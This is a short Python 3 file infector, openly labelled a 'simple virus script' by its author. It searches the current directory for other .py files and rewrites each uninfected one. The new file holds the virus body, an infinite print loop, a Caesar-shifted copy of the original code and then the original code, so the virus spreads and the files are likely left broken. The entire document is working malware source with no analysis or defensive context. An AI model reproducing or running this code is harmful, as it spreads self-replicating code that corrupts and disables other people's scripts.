##Simple virus script for python3
##Developed by Joshia Rheinier P.

def prankPrint(): #Make the 'injected stamp' function
    while True:
        print(";slvrBlt;")
#damned

import glob
from string import *
target = glob.glob("*.py")  #Search for other python script
for each in target:
    host = open(each,'r')
    hostcode = host.read()
    if hostcode.find(";slvrBlt;") == -1:
        vir_str = ''
        for string in hostcode:  #Create the virus by crypting/changing its text
            if 64< ord(string) < 120:
                encrypt = chr(ord(string)+3)
            elif 119 < ord(string) < 123:
                encrypt = chr(ord(string)+3-26)
            else: encrypt = string
            vir_str += encrypt
        host = open(each,'w')
        virus = open(__file__,'r')
        tmp = virus.read()
        tmp = tmp[:tmp.find("#damned")]+'prankPrint()'
        mybody = tmp+chr(10)+vir_str+chr(10)+hostcode
        virus.close()
        host.write(mybody)  #injecting the virus
